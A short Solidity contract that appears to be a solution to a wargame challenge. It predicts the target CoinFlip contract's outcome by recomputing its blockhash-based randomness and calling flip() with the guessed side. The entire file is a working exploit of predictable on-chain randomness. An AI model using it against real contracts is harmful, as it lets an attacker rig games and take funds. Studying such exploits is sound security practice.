pragma solidity 0.8.9;
import "./CoinFlip.sol";

contract CoinFlipAttack {
    CoinFlip enemyContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _enemyAddress) public {
        enemyContract = CoinFlip(_enemyAddress);
    }

    function filp() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 CoinFlip = uint256(blockValue / FACTOR);
        bool side = CoinFlip == 1 ? true : false;

        enemyContract.flip(side);
    }
}
